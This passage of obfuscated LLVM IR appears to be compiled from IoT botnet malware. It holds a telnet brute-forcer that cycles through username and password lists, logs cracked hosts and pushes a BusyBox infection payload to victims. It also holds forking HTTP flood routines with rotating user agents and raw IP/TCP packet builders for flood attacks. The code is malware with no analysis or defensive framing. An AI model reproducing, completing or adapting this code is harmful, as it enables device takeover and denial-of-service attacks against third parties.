  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 3
  %601 = load i8, i8* %600, align 1
  %602 = zext i8 %601 to i32
  %603 = icmp eq i32 %602, 2
  %604 = select i1 %603, i32 263600171, i32 -226445591
  store i32 %604, i32* %switchVar
  br label %loopEnd

; <label>:605:                                    ; preds = %loopEntry
  %606 = load i32, i32* %5, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %607
  call void @advance_state(%struct.telstate_t* %608, i32 7)
  store i32 -726211592, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  %610 = load i32, i32* @KadenCommStock, align 4
  %611 = load i32, i32* %5, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %612
  %614 = call i8* @get_telstate_host(%struct.telstate_t* %613)
  %615 = load i32, i32* %5, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 4
  %619 = load i8, i8* %618, align 2
  %620 = zext i8 %619 to i64
  %621 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %620
  %622 = load i8*, i8** %621, align 8
  %623 = load i32, i32* %5, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 5
  %627 = load i8, i8* %626, align 1
  %628 = zext i8 %627 to i64
  %629 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %628
  %630 = load i8*, i8** %629, align 8
  %631 = call i32 (i32, i8*, ...) @botnetPrint(i32 %610, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.101, i32 0, i32 0), i8* %614, i8* %622, i8* %630)
  %632 = load i32, i32* %5, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %633
  call void @advance_state(%struct.telstate_t* %634, i32 7)
  store i32 -726211592, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  store i32 -85153291, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  %637 = load i32, i32* %5, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %638
  call void @reset_telstate(%struct.telstate_t* %639)
  store i32 -85153291, i32* %switchVar
  br label %loopEnd

; <label>:640:                                    ; preds = %loopEntry
  store i32 1231171563, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i32, i32* %5, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  %647 = load i32, i32* %646, align 16
  %648 = add i32 %647, 7
  %649 = zext i32 %648 to i64
  %650 = call i64 @time(i64* null) #3
  %651 = icmp slt i64 %649, %650
  %652 = select i1 %651, i32 595740037, i32 1681433307
  store i32 %652, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  %654 = load i32, i32* %5, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %655
  call void @reset_telstate(%struct.telstate_t* %656)
  store i32 1681433307, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = call i64 @time(i64* null) #3
  %660 = trunc i64 %659 to i32
  %661 = load i32, i32* %5, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 7
  store i32 %660, i32* %664, align 16
  %665 = load i32, i32* %5, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 0
  %669 = load i32, i32* %668, align 16
  %670 = call i64 @send(i32 %669, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i32 0, i32 0), i64 4, i32 16384)
  %671 = icmp slt i64 %670, 0
  %672 = select i1 %671, i32 -1898898067, i32 1269202977
  store i32 %672, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  store i32 1269202977, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  %675 = load i32, i32* %5, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 16
  %680 = call i64 @send(i32 %679, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.103, i32 0, i32 0), i64 7, i32 16384)
  %681 = icmp slt i64 %680, 0
  %682 = select i1 %681, i32 -1990221057, i32 103373348
  store i32 %682, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  store i32 103373348, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i32, i32* %5, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 0
  %689 = load i32, i32* %688, align 16
  %690 = load i8*, i8** @BusyBoxPayload, align 8
  %691 = load i8*, i8** @BusyBoxPayload, align 8
  %692 = call i64 @strlen(i8* %691) #9
  %693 = call i64 @send(i32 %689, i8* %690, i64 %692, i32 16384)
  %694 = icmp slt i64 %693, 0
  %695 = select i1 %694, i32 -547569719, i32 529136452
  store i32 %695, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i32, i32* %5, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %698
  call void @reset_telstate(%struct.telstate_t* %699)
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:700:                                    ; preds = %loopEntry
  %701 = load i32, i32* %5, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 7
  %705 = load i32, i32* %704, align 16
  %706 = add i32 %705, 25
  %707 = zext i32 %706 to i64
  %708 = call i64 @time(i64* null) #3
  %709 = icmp slt i64 %707, %708
  %710 = select i1 %709, i32 -1895973637, i32 -1200132043
  store i32 %710, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i32, i32* %5, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 3
  %716 = load i8, i8* %715, align 1
  %717 = zext i8 %716 to i32
  %718 = icmp ne i32 %717, 3
  %719 = select i1 %718, i32 1313224925, i32 -753185817
  store i32 %719, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  store i32 -753185817, i32* %switchVar
  br label %loopEnd

; <label>:721:                                    ; preds = %loopEntry
  %722 = load i32, i32* %5, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %723
  call void @reset_telstate(%struct.telstate_t* %724)
  store i32 -1200132043, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -993238654, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  store i32 -623792744, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  %728 = load i32, i32* %5, align 4
  %729 = add nsw i32 %728, 1
  store i32 %729, i32* %5, align 4
  store i32 540009504, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  store i32 745255481, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %730, %727, %726, %NewDefault, %725, %721, %720, %711, %700, %696, %684, %683, %674, %673, %658, %657, %653, %642, %641, %640, %636, %635, %609, %605, %596, %587, %583, %568, %553, %549, %545, %536, %532, %506, %505, %501, %490, %489, %485, %481, %472, %457, %453, %449, %440, %436, %410, %409, %405, %394, %393, %389, %385, %376, %361, %360, %356, %345, %344, %340, %336, %335, %318, %314, %303, %269, %268, %259, %258, %257, %253, %249, %244, %221, %220, %195, %194, %193, %188, %179, %174, %153, %144, %124, %115, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %99, %92, %84, %79, %78, %77, %76, %75, %67, %66, %63, %49, %44, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1484562183, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1484562183, label %6
    i32 383889672, label %11
    i32 -1271898344, label %20
    i32 -723976534, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 383889672, i32 -723976534
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1271898344, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1484562183, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -807662356, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -807662356, label %6
    i32 405151129, label %10
    i32 854711652, label %19
    i32 -2122869513, label %23
    i32 1269684781, label %30
    i32 -377118979, label %31
    i32 -1559178520, label %36
    i32 -1773386330, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 405151129, i32 854711652
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -807662356, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -2122869513, i32 1269684781
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 1269684781, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -377118979, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -1559178520, i32 -1773386330
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -377118979, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 819726296, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 819726296, label %24
    i32 -218564267, label %29
    i32 1128963635, label %43
    i32 -1068057365, label %44
    i32 -238215655, label %50
    i32 -774872816, label %57
    i32 -1807609362, label %68
    i32 -117248292, label %69
    i32 1037522469, label %70
    i32 2100120766, label %71
    i32 -172804738, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 -218564267, i32 -172804738
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #3
  %35 = srem i32 %34, 36
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #3
  %40 = call i32 @fork() #3
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1128963635, i32 1037522469
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1068057365, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #3
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 -238215655, i32 -117248292
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 -774872816, i32 -1807609362
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -1807609362, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1068057365, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 2100120766, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 819726296, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.105, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -163722500, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -163722500, label %27
    i32 221356243, label %32
    i32 955460231, label %46
    i32 1959281880, label %47
    i32 -1695156425, label %53
    i32 -419366420, label %60
    i32 -172333084, label %71
    i32 1782339207, label %72
    i32 -1622065486, label %73
    i32 962626526, label %74
    i32 1840996757, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  %31 = select i1 %30, i32 221356243, i32 1840996757
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #3
  %38 = srem i32 %37, 36
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [36 x i8*], [36 x i8*]* @useragents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.104, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #3
  %43 = call i32 @fork() #3
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 955460231, i32 -1622065486
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1959281880, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %15, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @time(i64* null) #3
  %51 = icmp sgt i64 %49, %50
  %52 = select i1 %51, i32 -1695156425, i32 1782339207
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -419366420, i32 -172333084
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #9
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %13, align 4
  %67 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %68 = call i64 @read(i32 %66, i8* %67, i64 1)
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @close(i32 %69)
  store i32 -172333084, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 1959281880, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  store i32 962626526, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %14, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %14, align 4
  store i32 -163722500, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %74, %73, %71, %60, %53, %47, %46, %32, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
